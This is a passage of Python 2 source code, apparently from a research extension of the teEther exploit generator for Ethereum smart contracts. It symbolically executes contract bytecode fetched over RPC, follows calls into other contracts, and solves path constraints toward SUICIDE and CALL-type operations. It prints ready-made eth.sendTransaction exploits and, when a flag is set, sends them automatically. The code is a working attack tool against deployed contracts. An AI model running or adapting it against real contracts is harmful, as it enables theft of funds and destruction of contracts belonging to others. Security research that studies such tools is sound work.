                # logging.warn('????PART: ABORT the callee addr is a SLOAD Symbolic but NOT A STORAGE -> %s!!' % head_r.state.callee_addr )
                return
            #let's try to look for a prepend_sstore_get_addr exec
            storage_index = get_index_from_string(str(head_r.state.callee_addr))
            storage_result = address_find_prepend_r(storage_index, p, initial_storage, initial_balance, target_addr) #input is the STORAGE index of the addr
            #address_find_prepend_r() should actually return a generator beacsue there are multiple possible solutions - but we try the fist one for debugging
            if (not storage_result):
                logging.warn('????PART: ABORT; there are no SSTORE paths that alter this storage index')
                return
            hex_addr = hex(storage_result.state.callee_addr).rstrip("L")
            # for storage_result in storage_result_gen:
            #     if (storage_result):
            #         hex_addr = hex(storage_result.state.callee_addr).rstrip("L")
            #     else:
            #         return
        else:
            hex_addr = hex(head_r.state.callee_addr).rstrip("L")
            # logging.info('CALLER:the callee\'s addr is %s ', hex_addr)

        callee_p = addr_to_project(hex_addr)

        ####@@@@**** B1.2: find req_op on callee ******
        if (req_op == 'SSTORE'):
            callee_ins = callee_p.cfg.filter_ins('RETURN') + callee_p.cfg.filter_ins('STOP')
            find_sstore_flag = True
        else:  # 4xCC
            callee_ins = callee_p.cfg.filter_ins(req_op)
            callee_sload_bbs = {ins.bb.start for ins in callee_p.cfg.filter_ins('SLOAD')}
            find_sstore_flag = False

        if not callee_ins:
            logging.warn('PART: No %s instructions found on callee', 'RETURN/STOP' if req_op == 'SSTORE' else req_op)
            return
        logging.info('PART: Found %d %s instructions on callee', len(callee_ins), 'RETURN/STOP' if (req_op == 'SSTORE') else req_op)


        # save stack copy for tail later
        # head_r_stack_copy = copy(head_r.state.stack)
        # for i in copy(head_r.state.stack):
        #     head_r_stack_copy.append(i)

        # prepare an adjusted state of head
        # use non-reference copy because copy() really copies only the storage;
        adjusted_head_r_state = SymbolicEVMState(xid=head_r.xid, code=callee_p.code)


        if (reuse):
            adjusted_head_r_state.storage = copy(head_r.state.storage)
        else:
            # newState means new Storage
            pass

        adjusted_head_r_state.callee_addr = 1
        adjusted_head_r_state.call_args = head_r.state.call_args

        if (head_r.state.input_value != None): #input value can also be 0 - when ptr0 and size0; #if (head_r.state.input_value):
            adjusted_head_r_state.input_value = head_r.state.input_value
            logging.info("PART: INPUT_value being passed to callee")
            # logging.info("PART: INPUT_value being passed to callee: %s",head_r.state.input_value)
        else:
            logging.info("PART: NO input_value on this path? is this a call to fallback func?")

        # we're NOT using Inclusive because we actually DONT want to alter stack when CC happens - so return before CC happnes
        for calleecall, callee_path, callee_r in callee_p.get_constraints_CLONE(callee_ins,
                                                                          [0], #intresting_slices secondary check -> find_sstore would be checked first
                                                                          import_state=adjusted_head_r_state,
                                                                          find_sstore=find_sstore_flag,
                                                                          inclusive=False):
            logging.info("callee_r: Path: %s", '->'.join('%x' % path for path in callee_path))

            ####@@@@**** FROM_A1.3: execute the rest (TAIL) of CALLER to CC ******
            # Although this is a partial run - we still need to execute the tail; to end the whole call;
            # create a copy of head's SymbolicResults and adjust it to represent a successful return from call
            #todo actually beacsue we're looking only for SUICIDE; this means execution ends on this op - no tail!
            #todo whenever I add the other CCs -> then we'll have to execute the tail

            if (req_op == 'SUICIDE'):
                # callee_r.constraints.extend(head_r.constraints)
                # return_r = callee_r

                merged = CombinedSymbolicResult()
                merged.prepend(callee_r)
                merged.merge_prepend(head_r)
                return_r = merged.merge_results(initial_storage, initial_balance)

                # throwback to WF scheme
                # callee_r.constraints[:0] = head_r.constraints
                # return_r = callee_r
                # head_r.constraints[:0] = callee_r.constraints
                # return_r = head_r
                # return_r.state.success = True;

                # callee_r.constraints.extend(head_r.constraints)
                # return_r = callee_r


            else: #if (req_op in {'CALL', 'CALLCODE', 'DELEGATECALL'}):
                adjusted_state_for_tail = copy(head_r.state)
                # need to revert stack to the state before we can callee
                # while (len(adjusted_head_r_state.stack) != 0):
                #     adjusted_head_r_state.stack.pop()
                # for i in head_r_stack_copy:
                #     adjusted_head_r_state.stack.push(i)
                adjusted_state_for_tail.stack = copy(head_r.state.stack)

                adjusted_state_for_tail.pc += 1
                adjusted_state_for_tail.stack.append(1)

                adjusted_state_for_tail.callee_addr = head_r.state.callee_addr
                adjusted_state_for_tail.call_args = head_r.state.call_args


                if (reuse2):
                    adjusted_state_for_tail.storage = copy(callee_r.state.storage)
                else:
                    adjusted_state_for_tail.storage = SymbolicStorage(head_r.xid)


                if (callee_r.state.return_value != None):
                    adjusted_state_for_tail.return_value = callee_r.state.return_value
                    # logging.info("PART: RETURN_value being passed to tail: %s", callee_r.state.return_value)
                    logging.info("PART: RETURN_value being passed to tail")
                else:
                    logging.info("PART: NO return_value; is this just a return-less path?")
        #TAIL
                tail_r = p.run_symbolic(copy(head_r.path_left), state=adjusted_state_for_tail)
                if (not tail_r):
                    logging.info("$$$$$$$$$$$$$$$:tail_r: gave None back - ABORT")
                    return
                logging.info("tail_r: --- done executing tail on run_symoblic() ---")

                # add the constrains from the other two into the TAIL results

                merged = CombinedSymbolicResult()
                merged.prepend(tail_r)
                merged.merge_prepend(callee_r)
                merged.merge_prepend(head_r)
                return_r = merged.merge_results(initial_storage, initial_balance)

                #23.FEB: it had something to do with  adjusted_head_r_state.storage = copy(callee_r.state.storage)
                # theres something that is not boeing copied/passed with the mrege form head_r to the merged Result
                #running on 11

                # throwback to WF scheme
                # tail_r.constraints[:0] = callee_r.constraints  # works like a prepend-extend
                # tail_r.constraints[:0] = head_r.constraints
                # return_r = tail_r

                #Old extend
                # tail_r.constraints.extend(callee_r.constraints)
                # tail_r.constraints.extend(head_r.constraints)
                # return_r = tail_r



            #BACK FROM branch above; where  if (req_op == 'SUICIDE'):
            if (req_op == 'SSTORE'):
                return_r_list.append(return_r)
            else:  # 4xCC
                # add any exploits results with a SLOAD either in CALLER(tail_path) or callee
                if (set(head_path) & CALLER_sload_bbs) or (set(
                        callee_path) & callee_sload_bbs):
                    return_r_list.append(return_r)
                # try to exploit this CC path directly
                combined = CombinedSymbolicResult()
                combined.prepend(return_r)
                combined._combine(initial_storage, initial_balance)
                combined.simplify()
                try:
                    return attempt_exploit_suicide(combined, target_addr)
                except Nope:
                    continue

            # logging.info('-x-x-x- finished a whole callee_tail run-x-x-x-')

    logging.info('PART: all return results on op %s : %s', req_op, return_r_list)
    return



def addr_to_project(contract_addr):
    #or manaully
    # callee_code_path = "../teether-contracts/e_selfdest.contract.code"
    # callee_code_path = "../teether-contracts/e_simplereturn.contract.code"
    # callee_code_path = "../teether-contracts/e_supersimplereturn.contract.code"
    # callee_code_path = "../teether-contracts/e_changeOwner_func.contract.code"
    # callee_code_path = "../teether-contracts/e_changeOwner_func.contract.code"
    # callee_code_path = "../teether-contracts/e_return_msgsender.contract.code"
    # with open(callee_code_path) as infile:
    #     inbuffer = infile.read().rstrip()
    # callee_code = unhexlify(inbuffer)

    #get bytecode from RPC
    contract_code = getByteCode(contract_addr)
    # logging.info('***RPC: query of code: %s', contract_code)
    if (not contract_code[2:]):
        logging.info('***RPC: NO CODE RECIEVED on addr %s - abort' % contract_addr)
        logging.info('***check that input addr is correct and that the contract is not dead (after SUICIDE)')
        return None
    callee_p = Project(a2b_hex(contract_code[2:]), contract_addr=contract_addr)
    # logging.info('***loaded callee\'s code into callee\'s project')
    return callee_p

def hex_encode(d):
    return {k: hexlify(v) if isinstance(v, basestring) else v for k, v in d.iteritems()}

#gives back the int that is between two square brakcets; i.e. STORAGE_0[1] -> 1
def get_index_from_string(z3_string):
    start = '['
    end = ']'
    index = z3_string[z3_string.find(start) + len(start):z3_string.rfind(end)]
    return int(index)




def main(code_path, target_addr, amount, savefile=None, initial_storage_file=None, initial_balance=None, flags=None, execute_exploit=False):
    # savefilebase = savefile or code_path
    # contract_addr = None
    if code_path == 'do_RPC':
        # direct alter
        contract_addr = '0x40000000000000000000000000000000000000eb'
        execute_exploit = True
        # contract_addr = '0xfc11e689bd0d61428ed4ca2bc49f28617d5cf89c'
        p = addr_to_project(contract_addr)
        # print ('RPC code: ', p.code)
    elif code_path.startswith('0x'): #explicit addr in args
        contract_addr = code_path
        p = addr_to_project(contract_addr)
        # print ('RPC code: ', p.code)
    else:
        print ('file import as JSON/Binary is deactiaved!')
        return

    # elif code_path.endswith('.json'): #project.json already exists - read it
    #     with open(code_path, 'rb') as f:
    #         jd = json.load(f)
    #     p = Project.from_json(jd) #init new Proj with a json: {'code': hexlify(self.code), 'cfg': self.cfg.to_json()}
    # else: #create a project and save it as json
    #     with open(code_path) as infile:
    #         inbuffer = infile.read().rstrip()
    #     code = unhexlify(inbuffer)
    #     p = Project(code) #init new Proj just with the code
    #     #SAVE project as json
    #     # with open('%s.project.json' % savefilebase, 'w') as f:
    #     #     json.dump(p.to_json(), f)

    #Amount arg
    amount_check = '+' #defult
    amount = amount.strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)

    #Q:giving the proj a saved init state to reproduce real-world state of already existing contracts?
    initial_storage = dict()
    #if preconfigured storage record exist we load it into our initial_storage
    #the input dict/JSON is not sorted on key!!! so 1, 10, 11, 12, ... ,2 ,20, 21, BUT considering it will be parsed as a dict it's  supposed to work, I think
    if initial_storage_file:
        with open(initial_storage_file, 'rb') as f:
            initial_storage = {int(k, 16): int(v, 16) for k, v in json.load(f).iteritems()}

    #which flags to check for, default:ALL
    flags = flags or {'CALL', 'CALLCODE', 'DELEGATECALL', 'SUICIDE'}

    #results from regular combined_exploit
    result = combined_exploit(p, flags, int(target_addr, 16), amount, amount_check, initial_storage, initial_balance)

    #if got a possible exploit - print it out neatly ;)
    if result:

        call, r, model = result

        print "model: "
        print model
        #SAVE exploit project into a json
        # with open('%s.exploit.json' % savefilebase, 'w') as f:
        #     json.dump({'paths': [{'index': i, 'path': [ins for ins in res.state.trace if
        #                                                ins in p.cfg.bb_addrs or ins == res.state.trace[-1]]} for
        #                          i, res in enumerate(r.results)],
        #                'calls': [{'index': i, 'call': hex_encode(c)} for i, c in enumerate(call)]}, f)

        for i, res in enumerate(r.results):
            print '%d: %s' % (
            i, '->'.join('%x' % i for i in res.state.trace if i in p.cfg.bb_addrs or i == res.state.trace[-1]))
        print "call: "
        print call
        print
        for c in call:                    #int(target_addr, 16) #hexlify(c.get('payload', ''))
            # print 'Exploit: eth.sendTransaction({\n from:"0x%040x",\n data:"0x%s",\n to:"0x4000000000000000000000000000000000000001"%s,\n gasPrice:0\n})' % (
            print 'Exploit: eth.sendTransaction({ from:"0x%040x", data:"0x%s", to:"%s"%s, gasPrice:0})' % (
                int(target_addr, 16),
                hexlify(c.get('payload', '')),
                contract_addr,
                ", value:%d" % c['value'] if c.get('value', 0) else ''
            )
            if(execute_exploit):
                resp =  sendExploit(target_addr, hexlify(c.get('payload', '')), contract_addr, '0')
                # balance = checkBalance(contract_addr)
                # print ("Responce: %s with Balance: %s" % (resp, balance))
                print ("Responce: %s " % (resp))
            # if (c.get('callee_payload')):
            #     print 'the related callee exploit: data:"0x%s"\n\n' % hexlify(c.get('callee_payload', ''))

        return True


    return False


if __name__ == '__main__':
    # limit memory to 8GB
    mem_limit = 8 * 1024 * 1024 * 1024
    try:
        rsrc = resource.RLIMIT_VMEM
    except:
        rsrc = resource.RLIMIT_AS
    resource.setrlimit(rsrc, (mem_limit, mem_limit))

    fields = ['code','target-address','amount', 'savefile', 'initial-storage', 'initial-balance']
    config = {f: None for f in fields}
    config['flags'] = set()

    field_iter = iter(fields)
    for arg in sys.argv[1:]:
        if arg.startswith('--'):
            config['flags'].add(arg[2:].upper())
        else:
            field = next(field_iter)
            config[field] = arg

    if config['amount'] is None:
        print 'Usage: %s [flags] <code> <target-address> <amount> [savefile] [initial-storage file] [initial-balance]' % sys.argv[0]
        exit(-1)

    main(config['code'], config['target-address'], config['amount'], config['savefile'], config['initial-storage'], config['initial-balance'], config['flags'])
